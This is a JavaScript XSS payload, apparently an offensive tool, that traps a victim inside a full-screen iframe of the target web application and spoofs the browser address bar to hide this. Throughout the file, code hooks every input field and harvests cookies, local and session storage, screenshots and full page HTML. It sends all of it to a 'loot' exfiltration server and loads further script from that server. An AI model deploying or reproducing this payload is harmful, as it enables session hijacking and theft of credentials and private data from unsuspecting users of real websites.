//alert('Ready to launch trap?');





// *******************************************************************************

function initTaperVars()
{
	console.log("Initializing storage...");

	// Set to trap for iFrame trap, where
	// the payload needs to try to keep it's
	// own persistence. 
	// Set to implant for assume persistence
	// like adding directly to the javascript
	// on the application server. 
	// Setting: trap or implant
	window.taperMode = "trap";


	if (window.taperMode === "trap")
	{
		// Ue fullscreen for actual prod usage
		// not fullscreen shows the XSS laden landing

		// page in the background so you can 
		// tell if you're still where you need to be during
		// development. 
		window.taperfullscreenIframe = true; // Set to true for production use, false for dev
		// Whether or not to copy screenshots to background
		// Can make transitions smoother. Sometimes the
		// background page of the iFrame trap flashes through
		// when navigating the app. This hides that a bit
		// by copying the image to the background
		window.tapersetBackgroundImage = true;

		// What page in the application to start users in
		// Note that if the trap is loading from
		// a reload, it hopefully will automatically
		// load the page the user was on in the iframe
		// when they reloaded the page. Otherwise,
		// they'll start here
		window.taperstartingPage = "https://targetapp.possiblymalware.com/wp-admin";
	}

	// Exfil server
	window.taperexfilServer = "https://localhost:8444";

	// Should we exfil the entire HTML code?
	window.taperexfilHTML = true;


	// The following bits need session persistance
	// so they go in session storage instead of a 
	// a windows global variable. 


	// if (window.taperMode === trap)
	// {
	// 	sessionStorage.setItem('taperLastUrl', '');
	// 	//window.taperlastUrl = "";
	// }

	sessionStorage.setItem('taperLastUrl', '');
	//window.taperlastUrl = "";



	// Slow down the html2canvas
	window.taperloaded = false;




	// Client session
	sessionStorage.setItem('taperSessionName', '');
	//window.tapersessionName = "";

	// Cookie storage
	sessionStorage.setItem('taperCookieStorage', '');
	//window.tapercookieStorageDict = {};


	// Local storage
	sessionStorage.setItem('taperLocalStorage', '');
	//window.taperlocalStorageDict = {};


	// Session storage
	sessionStorage.setItem('taperSessionStorage', '');
	//window.tapersessionStorageDict = {};
}



// function cleanup(){
//  		sessionStorage.removeItem("taperClaimAlpha");
// }


function canAccessIframe(iframe) {
	try {
		return Boolean(iframe.contentDocument);
	}
	catch(e){
		return false;
	}
}


// Generate a session identifier
function initSession()
{
		// Values for client session identifiers
	const AdjectiveList = [
		"funky",
		"smelly",
		"skunky",
		"merry",
		"whimsical",
		"amusing",
		"hysterical",
		"bumfuzzled",
		"bodacious",
		"absurd",
		"animated",
		"brazen",
		"cheesy",
		"clownish",
		"confident",
		"crazy",
		"cuckoo",
		"deranged",
		"ludicrous",
		"playful",
		"quirky",
		"screwball",
		"slapstick",
		"wacky",
		"excited",
		"humorous",
		"charming",
		"confident",
		"fanatical"
		];

	const ColorList = [
		"blue",
		"red",
		"green",
		"white",
		"black",
		"brown",
		"azure",
		"pink",
		"yellow",
		"silver",
		"purple",
		"orange",
		"grey",
		"fuchsia",
		"crimson",
		"lime",
		"plum",
		"olive",
		"cyan",
		"ivory",
		"magenta"
		];

	const MurderCritter = [
		"kangaroo",
		"koala",
		"dropbear",
		"wombat",
		"wallaby",
		"dingo",
		"emu",
		"tassiedevil",
		"platypus",
		"salty",
		"kookaburra",
		"boxjelly",
		"blueringoctopus",
		"taipan",
		"stonefish",
		"redback",
		"cassowary",
		"funnelwebspider",
		"conesnail"
		];


	var adjective = AdjectiveList[Math.floor(Math.random()*AdjectiveList.length)];
	var color = ColorList[Math.floor(Math.random()*ColorList.length)];
	var murderer = MurderCritter[Math.floor(Math.random()*MurderCritter.length)];
	
	tapersessionName = adjective + "-" + color + "-" + murderer;
	sessionStorage.setItem('taperSessionName', tapersessionName);
	console.log("Session name picked: " + tapersessionName);
}



// Snag a screenshot and ship it
function sendScreenshot()
{
	if (taperloaded == false)
	{
		console.log("!!! Waiting 3 seconds to init html2canvas!");
		setTimeout(function () {}, 3000);
		taperloaded = true;
	}
	// console.log("---Snagging screenshot...");

	html2canvas(document.getElementById("iframe_a").contentDocument.getElementsByTagName("html")[0], {scale: 1}).then(canvas => 
	{
		function responseHandler() 
		{
			console.log(this.responseText)
		};

		//console.log("About to send image....");
		request = new XMLHttpRequest();request.addEventListener("load", responseHandler);
		request.open("POST", taperexfilServer + "/loot/screenshot/" + sessionStorage.getItem('taperSessionName'));


		// Helps hide flashing of the page when clicking around
		if (tapersetBackgroundImage)
		{
			document.body.style.backgroundImage = 'url('+canvas.toDataURL("image/png")+')';
			document.body.style.backgroundRepeat = "no-repeat";
			document.body.style.backgroundSize = "auto";
		}


		canvas.toBlob((blob) => 
		{
			const image = blob;
			request.send(image);
		});
	}).catch(e => console.log(e));
}





// Hook all the inputs so we can capture what was typed
// Called a lot to make sure we don't miss some input
// Code checks (attributes) makes sure we don't register 
// events multiple times
function hookInputs()
{
	if (window.taperMode === "trap")
	{
		// User inputs are down in the iframe trap
		inputs = document.getElementById("iframe_a").contentDocument.getElementsByTagName('input');
	}
	else
	{
		// We're running in implant mode, grab inputs
		// from main page. 
		inputs = document.getElementsByTagName('input');
	}


	for (index = 0; index < inputs.length; index++)
	{
		// Check to see if we've already hooked the input field. 
		// We can just use our own custom attribute to track, if it's
		// already hooked then skip it. If that attribute is missing, something happened
		// like a page change, but maybe the actual URL didn't change. 
		if (inputs[index].getAttribute("tappedState") != "true")
		{
			//console.log("!! Setting tappedState attribute on element index: " + index);
			inputs[index].setAttribute("tappedState", "true");

			// Adding event listeners to fire when the value in submitted 
			addEventListener(inputs[index], (event) => updateInput);
			inputs[index].addEventListener("change", function(){
				inputName = this.name;
				inputValue = this.value;
				request = new XMLHttpRequest();
				request.open("POST", taperexfilServer + "/loot/input/" + sessionStorage.getItem('taperSessionName'));
				request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
				var jsonObj = new Object();
				jsonObj["inputName"] = inputName;
				jsonObj["inputValue"] = inputValue;
				var jsonString = JSON.stringify(jsonObj);
				request.send(jsonString);
			});
		}
	}
}



// Check for cookies, see if values
// have been added or changed
// Only update backend if new cookie or value changed.

//indow.localStorage.setItem("meta", JSON.stringify(meta));
//var meta1 = JSON.parse(window.localStorage.getItem("meta"));

function checkCookies()
{
	cookieArray = document.cookie.split(';');
	for (index = 0; index < cookieArray.length; index++)
	{
		// console.log("++ Cookie loop: " + index);
		cookieData = cookieArray[index].split('=');
		// console.log("cookieName: " + cookieData[0]);
		// console.log("cookieValue: " + cookieData[1]);

		cookieName = cookieData[0];
		cookieValue = cookieData[1];
		// console.log("!!!!!   Checking cookies for: " + cookieName + ", " + cookieValue);

		var cookieDict = '';
		if (sessionStorage.getItem('taperCookieStorage').length > 0)
		{
			cookieDict = JSON.parse(sessionStorage.getItem('taperCookieStorage'));

			if (cookieName in cookieDict)
			{
				// console.log("== Existing cookie: " + cookieName);
				if (cookieDict[cookieName] != cookieValue)
				{
					// Existing cookie, but the value has changed
					// console.log("     New cookie value: " + cookieValue);
					// console.log("     Old cookie value: " + cookieStorageDict[cookieName]);
					cookieDict[cookieName] = cookieValue;
				}
				else
				{
					// Existing cookie, but no change in value to report
					// console.log("     Cookie value unchanged");
					continue;
				}
			}

		}

		//cookieDict = JSON.parse(sessionStorage.getItem('taperCookieStorage'));
		// else 
		// {

		// New cookie detected
		// console.log("++ New cookie: " + cookieName + ", with value: " + cookieValue);
		cookieDict[cookieName] = cookieValue;
		// }

		// Copy dictionary back to session storage
		if (cookieDict.length > 0)
		{
			sessionStorage.setItem('taperCookieStorage', JSON.stringify(cookieDict));
		}

		// Ship it
		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/dessert/" + sessionStorage.getItem('taperSessionName'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["cookieName"] = cookieName;
		jsonObj["cookieValue"] = cookieValue;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}


// Check for local storage data, see if values
// have been added or changed
// Only update backend if new data or value changed.
function checkLocalStorage()
{
	for (index = 0; index < localStorage.length; index++)
	{
		key = localStorage.key(index)
		value = localStorage.getItem(key)
		//console.log("~~~ Local storage: {" + key + ", " + value + "}");


		var localStorageDict = '';

		if (sessionStorage.getItem('taperLocalStorage').length > 0)
		{
			localStorageDict = JSON.parse(sessionStorage.getItem('taperLocalStorage'));

			if (key in localStorageDict)
			{
				// Existing local storage key
				//console.log("!!! Existing localstorage key...");
				if (localStorageDict[key] != value)
				{
					// Existing localStorage, but the value has changed
					// console.log("     New localStorage value: " + value);
					// console.log("     Old localStorage value: " + localStorageDict[key]);
					localStorageDict[key] = value;
				}
				else
				{
					// Existing cookie, but no change in value to report
					//console.log("     localStorgae value unchanged");
					continue;
				}
			}
		}

		// New localStorage entry
		//console.log("++ New localStorage: " + key + ", with value: " + value);
		localStorageDict[key] = value;

		// Copy dictionary back to session storage
		if (localStorageDict.length > 0)
		{
			sessionStorage.setItem('taperLocalStorage', JSON.stringify(localStorageDict));
		}


		// Ship it
		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/localstore/" + sessionStorage.getItem('taperSessionName'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["key"] = key;
		jsonObj["value"] = value;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}



// Check for session storage data, see if values
// have been added or changed
// Only update backend if new data or value changed.
function checkSessionStorage()
{
	for (index = 0; index < sessionStorage.length; index++)
	{
		key = sessionStorage.key(index)
		value = sessionStorage.getItem(key)
		console.log("~~~ Session storage: {" + key + ", " + value + "}");

		if (key === "taperSessionStorage" || 
			key === "taperLocalStorage" || 
			key === "taperCookieStorage"||
			key === "taperSessionName" ||
			key === "taperLastUrl")
		{
			// Should skip over our own session storage for reporting
			console.log("!!! Found taper data in session storage, hopefully SKIPPING");
			continue;
		}

		var sessionStorageDict = '';

		if (sessionStorage.getItem('taperSessionStorage').length > 0)
		{
			console.log("+++ taperSessionStorage has length...");
			sessionStorageDict = JSON.parse(sessionStorage.getItem('taperSessionStorage'));

			if (key in sessionStorageDict)
			{
				// Existing local storage key
				console.log("!!! Existing sessionstorage key...");
				if (sessionStorageDict[key] != value)
				{
					// Existing localStorage, but the value has changed
				 	console.log("     New sessionStorage value: " + value);
				 	console.log("     Old sessionStorage value: " + sessionStorageDict[key]);
					sessionStorageDict[key] = value;
				}
				else
				{
					// Existing sessionStorage, but no change in value to report
					console.log("     sessionStorage value unchanged");
					continue;
				}
			}
		}
		else
		{
			console.log("+++ In else statement for taperSessionStorage length check...");
		}
		// else
		// {
			// New localStorage entry
			// console.log("++ New sessionStorage: " + key + ", with value: " + value);
		// if (value != null)
		// {
		sessionStorageDict[key] = value;
		// }
		// }

		// Copy dictionary back to session storage
		console.log("!!!! About to set session storage value to: " + JSON.stringify(sessionStorageDict))
		console.log("Length of dict is: " + sessionStorageDict.length);
		if (sessionStorageDict.length > 0)
		{
			sessionStorage.setItem('taperSessionStorage', JSON.stringify(sessionStorageDict));
		}


		// Ship it
		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/sessionstore/" + sessionStorage.getItem('taperSessionName'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		var jsonObj = new Object();
		jsonObj["key"] = key;
		jsonObj["value"] = value;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);
	}
}



// Optional, copy the entire HTML and send out
function sendHTML()
{
	if(window.taperMode === "trap")
	{
		// iframe trap mode
		trapURL = document.getElementById("iframe_a").contentDocument.location.href;
		trapHTML = document.getElementById("iframe_a").contentDocument.documentElement.outerHTML;		
	}
	else
	{
		// implant mode
		trapHTML = document.outerHTML;
	}

	request = new XMLHttpRequest();
	request.open("POST", taperexfilServer + "/loot/html/" + sessionStorage.getItem('taperSessionName'));
	request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
	var jsonObj = new Object();
	jsonObj["url"] = trapURL;
	jsonObj["html"] = trapHTML;
	var jsonString = JSON.stringify(jsonObj);
	request.send(jsonString);
}



// Function to hold loot stealing acalls
function captureUrlChangeLoot()
{
	// Handle input scraping
	hookInputs();

	// Handle screenshotting
	sendScreenshot();


	// Exfil HTML code
	if (taperexfilHTML)
	{
		sendHTML();
	}
}




// When this update fires, it checks the iframe trap URL
// where the user thinks they are, then does a lot of things
// Steals inputs, URL, screenshots, etc. 
// Also updates their browser address bar so they 
// think they're on the page they're viewing in the
// iframe trap, not the one with the XSS vuln. 
function runUpdate()
{
	var currentUrl = "";
	var fullUrl = "";

	if (taperMode === "trap")
	{
		// iFrame trap mode
		// iFrame trap disable code
		if (!canAccessIframe(document.getElementById("iframe_a")))
		{
			// If we can't access the iframe anymore, that 
			// means the iframe has changed origin. They 
			// surfed away to a new domain, probably through a link
			// 
			// This is bad, the new page won't load in the iframe trap
			// and will throw very obvious errors on their page
			// indicating something isn't right  
			//
			// Safest thing is the kill the iframe trap and hope
			// no one notices. We'll reload the parent page to the current 
			// iframe page. It'll seem like clicking the link to the 
			// external page didn't work, but the second click will. 
			// First click exits the iframe, reloads the normally. 
			// Second click will properly load the external page. 
			// Sad to lose the trap through. 
			window.location = sessionStorage.getItem('');
		}

		currentUrl = document.getElementById("iframe_a").contentDocument.location.pathname;
		fullUrl = document.getElementById("iframe_a").contentDocument.location.href;
	}
	else
	{
		currentUrl = document.location.pathname;
		fullUrl = document.location.href;
	}





	// console.log("$$$ Location: " + document.getElementById("iframe_a").contentDocument.location);
	// console.log("$$$ Path: " + document.getElementById("iframe_a").contentDocument.location.pathname);
	// console.log("$$$ href: " + document.getElementById("iframe_a").contentDocument.location.href);

	// New page, let's steal stuff
	if (sessionStorage.getItem('taperLastUrl') != currentUrl)
	{
		// Handle URL recording
		console.log("New trap URL, stealing the things: " + currentUrl);
		sessionStorage.setItem('taperLastUrl', currentUrl);

		// This needs an API call to report the new page
		// and take a screenshot maybe, not sure if
		// screenshot timing will be right yet
		request = new XMLHttpRequest();
		request.open("POST", taperexfilServer + "/loot/location/" + sessionStorage.getItem('taperSessionName'));
		request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
		
		var jsonObj = new Object();
		jsonObj["url"] = fullUrl;
		var jsonString = JSON.stringify(jsonObj);
		request.send(jsonString);


		// We need to wait until the iframe/page has loaded to
		// do HTML based looting. 

		if (window.taperMode === "trap")
		{
			document.getElementById("iframe_a").onload = function() {
				// console.log("+++ Onload ready!");

				// Fake the URL that the user sees. This is important. 
				window.history.replaceState(null, '', currentUrl);

				captureUrlChangeLoot();

			}
		}
		else
		{
			document.onload = function() {
				captureUrlChangeLoot();
			}
		}
	}





	// Updates that need to happen constantly
	// hooking inputs, we can miss them otherwise
	// hookInputs intelligently knows whether inputs
	// need to be rehooked or not
	hookInputs();


	// Handle Cookies
	// Will only report when new cookies found, or values change. 
	checkCookies();


	// Check local storage
	// Will only report when new or changed data found
	checkLocalStorage();


	// Check session storage
	// Will only report when new or changed data found
	checkSessionStorage();

	if (window.taperMode === "trap")
	{
		// Fake the URL that the user sees. This is important. 
		window.history.replaceState(null, '', currentUrl);
	}
}






// Start the tap
function takeOver()
{
	var myReference = "";

	if (window.taperMode === "trap")
	{
		console.log("Starting iFrame Trap!");
	//document.body.style.backgroundColor = "pink";
	//document.innerHTML = "";

		// Setup our iframe trap
		var iframe = document.createElement("iframe");
		iframe.setAttribute("src", taperstartingPage);
		iframe.setAttribute("style", "border:none");

		if (taperfullscreenIframe)
		{
			console.log("&& Using fullscreen");
			iframe.style.width  = "100%";
			iframe.style.height = "100%";
			iframe.style.top = "0px";
			iframe.style.left = "0px"
		}
		else
		{
			console.log("&& Using partial screen");
			iframe.style.width  = "80%";
			iframe.style.height = "80%";
			iframe.style.top = "50px";
			iframe.style.left = "50px";
		}
		iframe.style.position = "fixed";
		iframe.id = "iframe_a";
		document.body.appendChild(iframe);


		// Hook needed events below...

		// Just register all the darned events, each event in the iframe
		// we'll call runUpdate()
		var myReference = document.getElementById('iframe_a');

	// Hook all the things for URL faking
		for(var key in myReference){
			if(key.search('on') === 0) {
				myReference.addEventListener(key.slice(2), runUpdate);
			}
		}		
	}
	else
	{
		console.log("Starting implant!");
		myReference = document.contentDocument;
		for(var key in myReference){
			if(key.search('on') === 0) {
				myReference.addEventListener(key.slice(2), runUpdate);
			}
		}		
	}
}





// ********************************************
// Go time




//if (sessionStorage.getItem("taperSystemLoaded")===null)
if (sessionStorage.getItem('taperSystemLoaded') != "true")
{
	sessionStorage.setItem("taperSystemLoaded","true");
	//window.taperSystemLoaded = true;
	//localStorage.setItem('trapLoaded', 'true');

	// window.addEventListener("visibilitychange", function(e){
	// 	cleanup();
	// });
	// window.addEventListener("beforeunload", function(e){
	// 	cleanup();
	// });

	
	initTaperVars();

	console.log("!!!! Loading payload!");
	// Blank the page so it doesn't show through as users 
	// navigate inside the iframe

	if (window.taperMode === "trap")
	{
		document.body.innerHTML = "";
		document.body.outerHTML = "";
	}


	// Pull in html2canvas
	var js = document.createElement("script");
	js.type = "text/javascript";
	js.src = taperexfilServer + "/lib/telemhelperlib.js";

	this.temp_define = window['define'];
	document.body.appendChild(js);
	window['define'] = undefined;

	// document.body.appendChild(js);
	// document.write('<script type="text/javascript" src="http://localhost:8444/lib/telemhelperlib.js"></script>');
	console.log("HTML2CANVAS added to DOM");


	// Pick our session ID
	initSession();


// Trap all the things
	takeOver();
}
else
{
	console.log("++++++ Already loaded payload!");
}



